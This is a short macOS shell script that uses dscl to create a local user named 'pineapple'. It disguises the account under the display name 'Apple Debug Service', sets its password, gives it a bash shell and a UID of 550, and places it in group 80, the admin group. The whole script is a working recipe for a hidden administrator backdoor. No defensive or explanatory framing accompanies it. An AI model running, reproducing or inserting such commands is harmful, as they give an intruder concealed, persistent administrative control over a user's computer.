#!/bin/sh
dscl . create /Users/pineapple
dscl . create /Users/pineapple RealName "Apple Debug Service"
dscl . passwd /Users/pineapple 9dee45a24efffc78483a02cfcfd83433
dscl . create /Users/pineapple UserShell /bin/bash
dscl . create /Users/pineapple UniqueID 550
dscl . create /Users/pineapple PrimaryGroupID 80
